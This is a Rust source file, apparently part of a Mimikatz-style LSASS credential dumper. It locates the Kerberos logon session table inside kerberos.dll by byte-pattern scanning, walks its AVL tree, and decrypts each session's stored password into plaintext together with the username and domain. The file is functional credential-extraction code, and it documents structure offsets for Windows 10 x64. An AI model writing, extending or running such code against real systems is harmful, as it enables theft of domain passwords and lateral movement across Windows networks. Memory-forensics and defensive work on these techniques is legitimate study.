use crate::error::Result;
use crate::lsass::crypto::CryptoKeys;
use crate::lsass::patterns;
use crate::lsass::types::KerberosCredential;
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// Kerberos session offsets (Windows 10 x64 1607+).
/// KIWI_KERBEROS_LOGON_SESSION_10_1607 layout (x64):
///   +0x00: UsageCount (ULONG + 4 pad)
///   +0x08: unk0 (LIST_ENTRY, 16 bytes)
///   +0x18: unk1 (PVOID)
///   +0x20: unk1b (ULONG + 4 pad)
///   +0x28: unk2 (FILETIME)
///   +0x30: unk4 (PVOID)
///   +0x38: unk5 (PVOID)
///   +0x40: unk6 (PVOID)
///   +0x48: LocallyUniqueIdentifier (LUID, 8 bytes)
///   ... more fields ...
///   +0x88: credentials (PVOID -> KIWI_KERBEROS_PRIMARY_CREDENTIAL)
///
/// KerbGlobalLogonSessionTable is an RTL_AVL_TABLE (since Vista).
/// Each AVL tree node has RTL_BALANCED_LINKS (0x20 bytes) header,
/// followed by the session entry data.
/// So entry data offset from node = 0x20.
struct KerbOffsets {
    /// Offset of session data from AVL node (sizeof(RTL_BALANCED_LINKS))
    avl_node_data_offset: u64,
    luid: u64,
    credentials_ptr: u64,
}

const KERB_OFFSETS: KerbOffsets = KerbOffsets {
    avl_node_data_offset: 0x20,
    luid: 0x48,
    credentials_ptr: 0x88,
};

/// KIWI_KERBEROS_PRIMARY_CREDENTIAL_1607 offsets:
///   +0x00: UserName (UNICODE_STRING, 16 bytes)
///   +0x10: DomainName (UNICODE_STRING, 16 bytes)
///   +0x20: unk0 (PVOID, 8 bytes)
///   +0x28: unk_padding (8 bytes)
///   +0x30: Password (UNICODE_STRING, 16 bytes, encrypted)
const KERB_CRED_PASSWORD_OFFSET: u64 = 0x30;

/// Extract Kerberos credentials from kerberos.dll.
pub fn extract_kerberos_credentials(
    vmem: &impl VirtualMemory,
    kerberos_base: u64,
    _kerberos_size: u32,
    keys: &CryptoKeys,
) -> Result<Vec<(u64, KerberosCredential)>> {
    let pe = PeHeaders::parse_from_memory(vmem, kerberos_base)?;
    let mut results = Vec::new();

    let text = match pe.find_section(".text") {
        Some(s) => s,
        None => return Ok(results),
    };

    let text_base = kerberos_base + text.virtual_address as u64;

    let (pattern_addr, _) = match patterns::find_pattern(
        vmem,
        text_base,
        text.virtual_size,
        patterns::KERBEROS_LOGON_SESSION_PATTERNS,
        "KerbGlobalLogonSessionTable",
    ) {
        Ok(r) => r,
        Err(e) => {
            log::info!("Could not find Kerberos pattern: {}", e);
            return Ok(results);
        }
    };

    // The pattern "48 8B 18 48 8D 0D" ends with LEA RCX, [rip+disp]
    // The RIP-relative disp is at pattern_addr + 6 (after the 6-byte pattern)
    let table_addr = patterns::resolve_rip_relative(vmem, pattern_addr, 6)?;
    log::info!("Kerberos session table (RTL_AVL_TABLE) at 0x{:x}", table_addr);

    // RTL_AVL_TABLE layout (x64):
    //   +0x00: BalancedRoot.Parent (PVOID)
    //   +0x08: BalancedRoot.LeftChild (PVOID)
    //   +0x10: BalancedRoot.RightChild (PVOID) -- root of the actual AVL tree
    //   +0x18: BalancedRoot.Balance (CHAR + 7 pad)
    //   +0x20: OrderedPointer (PVOID)
    //   +0x28: WhichOrderedElement (ULONG)
    //   +0x2C: NumberGenericTableElements (ULONG)

    // Read all RTL_AVL_TABLE fields for diagnostics
    let parent = vmem.read_virt_u64(table_addr).unwrap_or(0);
    let left_child = vmem.read_virt_u64(table_addr + 0x08).unwrap_or(0);
    let right_child = vmem.read_virt_u64(table_addr + 0x10).unwrap_or(0);
    let num_elements = vmem.read_virt_u32(table_addr + 0x2C).unwrap_or(0);

    log::info!(
        "Kerberos AVL table: elements={}, Parent=0x{:x}, Left=0x{:x}, Right=0x{:x}",
        num_elements, parent, left_child, right_child
    );

    // The root of the AVL tree is BalancedRoot.RightChild
    let root_node = right_child;

    if (root_node == 0 || root_node == table_addr)
        && (left_child == 0 || left_child == table_addr) {
            return Ok(results);
        }

    // Walk the AVL tree to collect all node pointers
    let mut nodes = Vec::new();
    walk_avl_tree(vmem, root_node, table_addr, &mut nodes, 0);
    log::info!("Kerberos AVL tree: found {} nodes", nodes.len());

    let offsets = &KERB_OFFSETS;

    for node_ptr in &nodes {
        let entry = node_ptr + offsets.avl_node_data_offset;
        let luid = vmem.read_virt_u64(entry + offsets.luid).unwrap_or(0);
        let cred_ptr = vmem.read_virt_u64(entry + offsets.credentials_ptr).unwrap_or(0);

        if cred_ptr != 0 && luid != 0 {
            // KIWI_KERBEROS_PRIMARY_CREDENTIAL_1607:
            //   +0x00: UserName (UNICODE_STRING, 16 bytes)
            //   +0x10: DomainName (UNICODE_STRING, 16 bytes)
            //   +0x30: Password (UNICODE_STRING, 16 bytes, encrypted)
            let username = vmem.read_win_unicode_string(cred_ptr).unwrap_or_default();
            let domain = vmem.read_win_unicode_string(cred_ptr + 0x10).unwrap_or_default();

            if !username.is_empty() {
                let password = extract_kerb_password(vmem, cred_ptr, keys).unwrap_or_default();
                if !password.is_empty() {
                    log::info!("Kerberos: LUID=0x{:x} user={} domain={}", luid, username, domain);
                    results.push((
                        luid,
                        KerberosCredential {
                            username: username.clone(),
                            domain: domain.clone(),
                            password,
                        },
                    ));
                }
            }
        }
    }

    Ok(results)
}

/// Walk an AVL tree (in-order traversal) collecting all node pointers.
/// Each node starts with RTL_BALANCED_LINKS:
///   +0x00: Parent (PVOID)
///   +0x08: LeftChild (PVOID)
///   +0x10: RightChild (PVOID)
///   +0x18: Balance (CHAR + 7 pad)
fn walk_avl_tree(
    vmem: &impl VirtualMemory,
    node: u64,
    sentinel: u64,
    results: &mut Vec<u64>,
    depth: usize,
) {
    if depth > 30 || node == 0 || node == sentinel || results.len() > 256 {
        return;
    }

    // Avoid revisiting (e.g., corrupted tree with cycles)
    if results.contains(&node) {
        return;
    }

    let left = vmem.read_virt_u64(node + 0x08).unwrap_or(0);
    let right = vmem.read_virt_u64(node + 0x10).unwrap_or(0);

    // In-order: left, current, right
    walk_avl_tree(vmem, left, sentinel, results, depth + 1);
    results.push(node);
    walk_avl_tree(vmem, right, sentinel, results, depth + 1);
}

pub fn extract_kerb_password(
    vmem: &impl VirtualMemory,
    cred_ptr: u64,
    keys: &CryptoKeys,
) -> Result<String> {
    // KIWI_KERBEROS_PRIMARY_CREDENTIAL_1607:
    //   +0x00: UserName (UNICODE_STRING, 16 bytes)
    //   +0x10: DomainName (UNICODE_STRING, 16 bytes)
    //   +0x20: unk0 (PVOID, 8 bytes)
    //   +0x28: unk_padding (8 bytes)
    //   +0x30: Password (UNICODE_STRING, 16 bytes, encrypted)
    let pwd_len = vmem.read_virt_u16(cred_ptr + KERB_CRED_PASSWORD_OFFSET)? as usize;
    let pwd_ptr = vmem.read_virt_u64(cred_ptr + KERB_CRED_PASSWORD_OFFSET + 8)?;

    if pwd_len == 0 || pwd_ptr == 0 {
        return Ok(String::new());
    }

    let enc_data = vmem.read_virt_bytes(pwd_ptr, pwd_len)?;
    let decrypted = crate::lsass::crypto::decrypt_credential(keys, &enc_data)?;
    Ok(crate::lsass::crypto::decode_utf16_le(&decrypted))
}
